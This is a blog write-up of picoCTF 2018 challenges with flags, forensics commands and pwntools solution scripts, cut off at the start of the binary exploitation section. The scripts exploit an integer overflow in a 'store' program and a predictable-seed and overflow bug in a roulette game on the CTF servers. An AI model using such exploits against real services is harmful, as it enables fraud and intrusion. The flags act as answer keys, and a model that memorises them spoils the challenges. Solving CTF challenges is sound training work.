<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>picoCTF-2018 解题报告 | 闲言语</title><meta name=keywords content><meta name=description content="题目：
https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}
Forensics Warmup 2 picoCTF{extensions_are_a_lie}
Desrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You'll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180929-picoctf/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="picoCTF-2018 解题报告"><meta property="og:description" content="题目：
https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}
Forensics Warmup 2 picoCTF{extensions_are_a_lie}
Desrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You'll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180929-picoctf/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-10-11T22:07:27+08:00"><meta property="article:modified_time" content="2018-10-11T22:07:27+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="picoCTF-2018 解题报告"><meta name=twitter:description content="题目：
https://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}
Forensics Warmup 2 picoCTF{extensions_are_a_lie}
Desrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You'll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"picoCTF-2018 解题报告","item":"https://ret2neo.cn/post/180929-picoctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"picoCTF-2018 解题报告","name":"picoCTF-2018 解题报告","description":"题目：\nhttps://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}\nForensics Warmup 2 picoCTF{extensions_are_a_lie}\nDesrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You\u0026#39;ll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address?","keywords":[],"articleBody":" 题目：\nhttps://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}\nForensics Warmup 2 picoCTF{extensions_are_a_lie}\nDesrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You'll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones. 250.226.237.236 Correct! How many unique destination IP addresses were targeted by the source IP address 193.1.59.100? 2 Correct! What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places. 1.43 Correct! Great job. You've earned the flag: picoCTF{J4y_s0n_d3rUUUULo_23fa6fa6} /*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43 import json j=json.load(open('incidents.json')) tickets=j['tickets'] hashes=dict() for t in tickets: if t['file_hash'] not in hashes.keys(): hashes[t['file_hash']]=[t['dst_ip']] else: hashes[t['file_hash']].append(t['dst_ip']) print hashes # { # u'78d8572c143fb161': [u'90.174.224.210'], # u'a275ec611d018a67': [u'94.165.167.88'], # u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], # u'27d9b03884d73aaa': [u'94.165.167.88'], # u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], # u'ea45791ce3528103': [u'127.19.170.162'], # u'729b56eab8ac3252': [u'94.165.167.88']} */ Reading Between the Eyes picoCTF{r34d1ng_b37w33n_7h3_by73s}\nRecovering From the Snap 1 2 3 4 5 6 7 8 9 root@kali:~/桌面/picoctf# file animals.dd animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", sectors/cluster 4, root entries 512, sectors 20480 (volumes \u003c=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit) root@kali:~/桌面/picoctf# fdisk -lu animals.dd Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x00000000 参考 这里 ，使用OSFMount 挂载磁盘，使用 TestDisk \u0026 PhotoRec 7.1-WIP, Data Recovery 恢复被删除的theflag.jpg 。\npicoCTF{th3_5n4p_happ3n3d}\nadmin panel 用wireshark打开，导出HTTP对象，其中一个文件内容是user=admin\u0026password=picoCTF{n0ts3cur3_df598569} 。\nhex editor 1 2 strings hex_editor.jpg | grep pico Your flag is: \"picoCTF{and_thats_how_u_edit_hex_kittos_8BcA67a2}\" Truly an Artist 1 2 strings 2018.png | grep pico picoCTF{look_in_image_9f5be995} now you don’t picoCTF{n0w_y0u_533_m3}\nExt Super Magic 根据提示使用debugfs查看img文件，发现幻数损坏。\n1 2 3 4 # debugfs ext.img debugfs 1.44.4 (18-Aug-2018) debugfs: Bad magic number in super-block while trying to open ext.img ....... 从文档（https://wiki.osdev.org/Ext2#Superblock）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为0xef53 。需注意采用小端序，低字节在低地址。\n根据文档修改superblock，然后可以mount到系统，发现有个flag图片。\n1 2 3 4 5 6 7 8 9 10 # file fix.img fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files) # xxd ext.img \u003e ext.hex # xxd fix.img \u003e fix.hex # diff *.hex 68c68 \u003c 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000 4..[............ --- \u003e 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000 4..[....S....... # mkdir tmpdir \u0026\u0026 mount fix.img tmpdir \u0026\u0026 ll tmpdir/ | grep flag 尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。\n1 2 3 4 5 6 $apt install gocr $apt install cuneiform $apt install tesseract-ocr $tesseract cut_flag.jpg res \u0026\u0026 cat res.txt Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica Your flag is: \"picoCTF {FDBfbc6141e7F 4bscI90CIaE7SbI63aEf} \" 最后结果：picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}\nLying Out 根据日常流量图判断流量可能异常的时间点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * log=[ 10900,10800,10850,11000,10800,10750,10800,10850, 10900,11000,10800,10800,11000,10900,10700,10850, 10800,10850,11000,11050,10650,10800,10700,11000, 10900,10950,10950,10800,11000,11100,11900,13400, 13800,13400,12000,11000,10800,10800,10700,10800, 10800,11000,10900,11050,11800,13100,14600,16100, 16600,16400,14400,12800,11800,11000,10950,10800, 10800,10800,10800,10800,10900,10850,10850,10800, 10800,11000,11000,11000,11400,11900,13000,14000, 14800,15800,16200,15800,14700,13700,12200,12100, 11100,11000,10900,10800,10700,11000,11000,10800, 10900,10700,10900,10800,10750,10950,10900,10800 ] r=remote('2018shell2.picoctf.com',39410) prompt=r.recvuntil('num_IPs') data=r.recv() nums=data.split() print prompt,'\\n',nums group=len(nums)/4 res=[] for i in range(group): t=nums[i*4+2].split(':') tt=int(t[0])*4+int(t[1])/15 if int(nums[i*4+3])\u003elog[tt]: res.append(nums[i*4]) r.sendline(' '.join(res)) print ' '.join(res),r.recv() r.close() # [x] Opening connection to 2018shell2.picoctf.com on port 39410 # [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204 # [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done # You'll need to consult the file `traffic.png` to answer the following questions. # Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7. # log_ID time num_IPs # ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', '4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619'] # 0 1 2 9 Correct! # Great job. You've earned the flag: picoCTF{w4y_0ut_940df760} # [*] Closed connection to 2018shell2.picoctf.com port 39410 # [Finished in 3.6s] What’s My Name? picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}\nMalware Shops 附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ nc 2018shell2.picoctf.com 57920 You'll need to consult the file `clusters.png` to answer the following questions. How many attackers created the malware in this dataset? 5 Correct! In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file's hash. hash jmp_count add_count 0 87847bfc 32.0 29.0 1 7eeed4b3 34.0 34.0 2 ad5e4ce0 21.0 64.0 3 628e79cf 14.0 26.0 4 b5e53809 11.0 35.0 5 ebaf5ccd 15.0 13.0 6 94ad3582 37.0 10.0 7 42f1d364 23.0 68.0 8 93827b93 11.0 38.0 9 c08300fe 41.0 10.0 7eeed4b3 Correct! Great job. You've earned the flag: picoCTF{w4y_0ut_0915ebc6} LoadSomeBits 最低有效位隐写，需要fuzz起始偏移。\n1 2 3 4 5 6 7 8 9 10 11 12 # cat lsb.py import binascii lsb=''.join(map(lambda x:str(ord(x)\u00261),open('pico2018-special-logo.bmp','rb').read())) for offset in range(16): tmp=lsb[offset:] tmps=''.join(chr(int(tmp[i:i+8],2)) for i in range(0,len(tmp),8)) if 'pico' in tmps: print tmps break # python lsb.py | strings | grep -o picoCTF{.*} picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693} core core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 gdb program [core dump] 开始调试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 (gdb) disas main Dump of assembler code for function main: 0x080487ec \u003c+0\u003e: lea ecx,[esp+0x4] 0x080487f0 \u003c+4\u003e: and esp,0xfffffff0 0x080487f3 \u003c+7\u003e: push DWORD PTR [ecx-0x4] 0x080487f6 \u003c+10\u003e: push ebp 0x080487f7 \u003c+11\u003e: mov ebp,esp 0x080487f9 \u003c+13\u003e: push ecx 0x080487fa \u003c+14\u003e: sub esp,0x4 0x080487fd \u003c+17\u003e: call 0x80485bb 0x08048802 \u003c+22\u003e: call 0x80487c1 0x08048807 \u003c+27\u003e: mov eax,0x0 0x0804880c \u003c+32\u003e: add esp,0x4 0x0804880f \u003c+35\u003e: pop ecx 0x08048810 \u003c+36\u003e: pop ebp 0x08048811 \u003c+37\u003e: lea esp,[ecx-0x4] 0x08048814 \u003c+40\u003e: ret End of assembler dump. (gdb) disas print_flag Dump of assembler code for function print_flag: =\u003e 0x080487c1 \u003c+0\u003e: push ebp 0x080487c2 \u003c+1\u003e: mov ebp,esp 0x080487c4 \u003c+3\u003e: sub esp,0x18 0x080487c7 \u003c+6\u003e: mov DWORD PTR [ebp-0xc],0x539 0x080487ce \u003c+13\u003e: mov eax,DWORD PTR [ebp-0xc] 0x080487d1 \u003c+16\u003e: mov eax,DWORD PTR [eax*4+0x804a080] 0x080487d8 \u003c+23\u003e: sub esp,0x8 0x080487db \u003c+26\u003e: push eax ;flag字符串的地址保存在eax中 0x080487dc \u003c+27\u003e: push 0x804894c 0x080487e1 \u003c+32\u003e: call 0x8048410 0x080487e6 \u003c+37\u003e: add esp,0x10 0x080487e9 \u003c+40\u003e: nop 0x080487ea \u003c+41\u003e: leave 0x080487eb \u003c+42\u003e: ret End of assembler dump. (gdb) x/sb *(0x804a080+4*0x539) 0x80610f0: \"c96bd0fa2da5c0853cf12c4f93fce288\"s picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}每个人的答案是不同的。\nGeneral Skills absolutely relative 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include #include #define yes_len 3 const char *yes = \"yes\"; int main() { char flag[99]; char permission[10]; int i; FILE * file; file = fopen(\"/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt\" , \"r\"); if (file) { while (fscanf(file, \"%s\", flag)!=EOF) fclose(file); } file = fopen( \"./permission.txt\" , \"r\"); if (file) { for (i = 0; i \u003c 5; i++){ fscanf(file, \"%s\", permission); } permission[5] = '\\0'; fclose(file); } if (!strncmp(permission, yes, yes_len)) { printf(\"You have the write permissions.\\n%s\\n\", flag); } else { printf(\"You do not have sufficient permissions to view the flag.\\n\"); } return 0; } picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}\nAca-Shell-A 1 picoCTF{CrUsHeD_It_17ab99f5} in out error 1 2 echo \"Please may I have the flag?\" | ./in-out-error \u003e ~/result.txt #picoCTF{p1p1ng_1S_4_7h1ng_f37fb67e} learn gdb picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}\nstore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 root@kali:~# curl https://2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c #include #include int main() { int con; con = 0; int account_balance = 1100; while(con == 0){ printf(\"Welcome to the Store App V1.0\\n\"); printf(\"World's Most Secure Purchasing App\\n\"); printf(\"\\n[1] Check Account Balance\\n\"); printf(\"\\n[2] Buy Stuff\\n\"); printf(\"\\n[3] Exit\\n\"); int menu; printf(\"\\n Enter a menu selection\\n\"); fflush(stdin); scanf(\"%d\", \u0026menu); if(menu == 1){ printf(\"\\n\\n\\n Balance: %d \\n\\n\\n\", account_balance); } else if(menu == 2){ printf(\"Current Auctions\\n\"); printf(\"[1] I Can't Believe its not a Flag!\\n\"); printf(\"[2] Real Flag\\n\"); int auction_choice; fflush(stdin); scanf(\"%d\", \u0026auction_choice); if(auction_choice == 1){ printf(\"Imitation Flags cost 1000 each, how many would you like?\\n\"); int number_flags = 0; fflush(stdin); scanf(\"%d\", \u0026number_flags); if(number_flags \u003e 0){ int total_cost = 0; total_cost = 1000*number_flags; printf(\"\\nYour total cost is: %d\\n\", total_cost); if(total_cost \u003c= account_balance){ account_balance = account_balance - total_cost; printf(\"\\nYour new balance: %d\\n\\n\", account_balance); } else{ printf(\"Not enough funds\\n\"); } } } else if(auction_choice == 2){ printf(\"A genuine Flag costs 100000 dollars, and we only have 1 in stock\\n\"); printf(\"Enter 1 to purchase\"); int bid = 0; fflush(stdin); scanf(\"%d\", \u0026bid); if(bid == 1){ if(account_balance \u003e 100000){ printf(\"YOUR FLAG IS:\\n\"); } else{ printf(\"\\nNot enough funds for transaction\\n\\n\\n\"); }} } } else{ con = 1; } } return 0; } 整数溢出。\n1 2 python -c 'print \"2\\n1\\n\"+str(((1100-100001)+2**32)/1000)+\"\\n2\\n2\\n1\\n3\\n\"' | nc 2018shell2.picoctf.com 43581 | grep pico # Enter 1 to purchaseYOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c} roulette 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 #include #include #include #include #include #include #define MAX_NUM_LEN 12 #define HOTSTREAK 3 #define MAX_WINS 16 #define ONE_BILLION 1000000000 #define ROULETTE_SIZE 36 #define ROULETTE_SPINS 128 #define ROULETTE_SLOWS 16 #define NUM_WIN_MSGS 10 #define NUM_LOSE_MSGS 5 long cash = 0; long wins = 0; //判断字符是否是数字,是则返回真。 int is_digit(char c) { return '0' \u003c= c \u0026\u0026 c \u003c= '9'; } //从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。 long get_long() { printf(\"\u003e \"); uint64_t l = 0; char c = 0; while(!is_digit(c)) c = getchar(); while(is_digit(c)) { if(l \u003e= LONG_MAX) { l = LONG_MAX; break; } l *= 10; l += c - '0'; c = getchar(); } while(c != '\\n') c = getchar(); return l; } //随机返回一个小于5000的正整数 long get_rand() { long seed; FILE *f = fopen(\"/dev/urandom\", \"r\"); fread(\u0026seed, sizeof(seed), 1, f); fclose(f); seed = seed % 5000; if (seed \u003c 0) seed = seed * -1; srand(seed); return seed; } //打印当前资金和获胜次数，下注。（输入点一） long get_bet() { while(1) { puts(\"How much will you wager?\"); printf(\"Current Balance: $%lu \\t Current Wins: %lu\\n\", cash, wins); long bet = get_long(); if(bet \u003c= cash) { return bet; } else { puts(\"You can't bet more than you have!\"); } } } //选择下注目标1~36.（输入点二） long get_choice() { while (1) { printf(\"Choose a number (1-%d)\\n\", ROULETTE_SIZE); long choice = get_long(); if (1 \u003c= choice \u0026\u0026 choice \u003c= ROULETTE_SIZE) { return choice; } else { puts(\"Please enter a valid choice.\"); } } } //打印flag int print_flag() { char flag[48]; FILE *file; file = fopen(\"flag.txt\", \"r\"); if (file == NULL) { printf(\"Failed to open the flag file\\n\"); return -1; } fgets(flag, sizeof(flag), file); printf(\"%s\", flag); return 0; } //一些输赢后的提示语 const char *win_msgs[NUM_WIN_MSGS] = { \"Wow.. Nice One!\", \"You chose correct!\", \"Winner!\", \"Wow, you won!\", \"Alright, now you're cooking!\", \"Darn.. Here you go\", \"Darn, you got it right.\", \"You.. win.. this round...\", \"Congrats!\", \"You're not cheating are you?\", }; const char *lose_msgs1[NUM_LOSE_MSGS] = { \"WRONG\", \"Nice try..\", \"YOU LOSE\", \"Not this time..\", \"Better luck next time...\" }; const char *lose_msgs2[NUM_LOSE_MSGS] = { \"Just give up!\", \"It's over for you.\", \"Stop wasting your time.\", \"You're never gonna win\", \"If you keep it up, maybe you'll get the flag in 100000000000 years\" }; //模拟转盘效果 void spin_roulette(long spin) { int n; puts(\"\"); printf(\"Roulette : \"); int i, j; int s = 12500; for (i = 0; i \u003c ROULETTE_SPINS; i++) { n = printf(\"%d\", (i%ROULETTE_SIZE)+1); usleep(s); for (j = 0; j \u003c n; j++) { printf(\"\\b \\b\"); } } for (i = ROULETTE_SPINS; i \u003c (ROULETTE_SPINS+ROULETTE_SIZE); i++) { n = printf(\"%d\", (i%ROULETTE_SIZE)+1); if (((i%ROULETTE_SIZE)+1) == spin) { for (j = 0; j \u003c n; j++) { printf(\"\\b \\b\"); } break; } usleep(s); for (j = 0; j \u003c n; j++) { printf(\"\\b \\b\"); } } for (int k = 0; k \u003c ROULETTE_SIZE; k++) { n = printf(\"%d\", ((i+k)%ROULETTE_SIZE)+1); s = 1.1*s; usleep(s); for (j = 0; j \u003c n; j++) { printf(\"\\b \\b\"); } } printf(\"%ld\", spin); usleep(s); puts(\"\"); puts(\"\"); } //生成一个随机数，如果和choice一样，就给cash加双倍bet。 void play_roulette(long choice, long bet) { printf(\"Spinning the Roulette for a chance to win $%lu!\\n\", 2*bet); long spin = (rand() % ROULETTE_SIZE)+1; spin_roulette(spin); if (spin == choice) { cash += 2*bet; puts(win_msgs[rand()%NUM_WIN_MSGS]); wins += 1; } else { puts(lose_msgs1[rand()%NUM_LOSE_MSGS]); puts(lose_msgs2[rand()%NUM_LOSE_MSGS]); } puts(\"\"); } //获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。 int main(int argc, char *argv[]) { setvbuf(stdout, NULL, _IONBF, 0); cash = get_rand(); puts(\"Welcome to ONLINE ROULETTE!\"); printf(\"Here, have $%ld to start on the house! You'll lose it all anyways \u003e:)\\n\", cash); puts(\"\"); long bet; long choice; while(cash \u003e 0) { bet = get_bet(); cash -= bet; choice = get_choice(); puts(\"\"); play_roulette(choice, bet); if (wins \u003e= MAX_WINS) { printf(\"Wow you won %lu times? Looks like its time for you cash you out.\\n\", wins); printf(\"Congrats you made $%lu. See you next time!\\n\", cash); exit(-1); } if(cash \u003e ONE_BILLION) { printf(\"*** Current Balance: $%lu ***\\n\", cash); if (wins \u003e= HOTSTREAK) { puts(\"Wow, I can't believe you did it.. You deserve this flag!\"); print_flag(); exit(0); } else { puts(\"Wait a second... You're not even on a hotstreak! Get out of here cheater!\"); exit(-1); } } } puts(\"Haha, lost all the money I gave you already? See ya later!\"); return 0; } 提示说有两个bug。\n其一出现在第27行，get_Long()函数的uint64_t l = 0; 。函数声明的返回值为long 型，实际返回值为uint64_t 型，前者有符号最大值为LONG_MAX:2^31-1 ，后者无符号最大值为ULONG_MAX:2^64-1 ，存在向上溢出为负数的风险。\n真正使上溢成为可能的是32-35行 if(l \u003e= LONG_MAX){l = LONG_MAX; break;} ，这个判断希望控制返回值不超过long 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。\n到此为止，我们可以控制cash为任意值了，只要输入bet为 当前cash+2^32-目标cash ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。\n要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。\n如果要改变wins，只能使choice与166行的 long spin = (rand() % ROULETTE_SIZE)+1; 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md ，偷个懒就不写了。\npicoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #get_rand_seq.c #include #include #include #include #include #include int main(int argc, char *argv[]) { int seed = atoi(argv[1]); srand(seed); for (int i = 0; i \u003c 100; ++i) printf(\"%d,\", rand()); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #!/usr/bin/env python from pwn import * import subprocess r = remote('2018shell1.picoctf.com', 21444) sleep(1) lines = r.recvuntil('\u003e ').split('\\n') print '\\n'.join(lines) balance = int(lines[1].split()[2][1:]) log.info(\"Start balance: {}\".format(balance)) log.info(\"Predicting random values\") values = subprocess.check_output([\"./get_rand_seq\", str(balance)]) values = values.split(',') values = [int(v, 10) for v in values[:-1]] i = 0 ROULETTE_SIZE = 36 for _ in range(4): spin = (values[i] % ROULETTE_SIZE) + 1 i += 2 log.info(\"Putting {}$ on {}\".format(balance, spin)) r.sendline(\"{}\".format(balance)) r.sendline(\"{}\".format(spin)) balance *= 2 print r.recvuntil('\u003e ') print r.recv() spin = (values[i] % ROULETTE_SIZE) + 1 i += 2 log.info(\"Putting {}$ on {}\".format(11474836400, spin)) r.sendline(\"{}\".format(11474836400)) # Put some negative numbers, bug in get_long r.sendline(\"{}\".format((spin + 1) % 36)) print r.recvuntil('You deserve this flag!') print r.recvall() r.close() scriptme 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@kali:~/bintest# nc 2018shell2.picoctf.com 61344 Rules: () + () = ()() =\u003e [combine] ((())) + () = ((())()) =\u003e [absorb-right] () + ((())) = (()(())) =\u003e [absorb-left] (())(()) + () = (())(()()) =\u003e [combined-absorb-right] () + (())(()) = (()())(()) =\u003e [combined-absorb-left] (())(()) + ((())) = ((())(())(())) =\u003e [absorb-combined-right] ((())) + (())(()) = ((())(())(())) =\u003e [absorb-combined-left] () + (()) + ((())) = (()()) + ((())) = ((()())(())) =\u003e [left-associative] Example: (()) + () = () + (()) = (()()) Let's start with a warmup. (()()()) + (()) = ??? solve.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from pwn import * def depth(s): cnt=0 while(len(s)!=0): s=s.replace('()','') cnt+=1 return cnt def calc(s1,s2): d1=depth(s1) d2=depth(s2) if d1==d2: return s1+s2 if d1\u003cd2: return \"(%s%s)\"%(s1,s2[1:-1]) if d1\u003ed2: return \"(%s%s)\"%(s1[1:-1],s2) solve = lambda x:reduce(calc,x.replace(\" \",'').split('+')) host = '2018shell2.picoctf.com' port = 61344 r=remote(host,port) while True: try: lines=r.recvuntil('\\n\u003e').split('\\n') print '\\n'.join(lines) din=lines[-3].split('=')[0] r.sendline(solve(din)) except: print r.recv() break r.close() picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}\nbinary exploitation buffer overflow 0 picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include #include #include 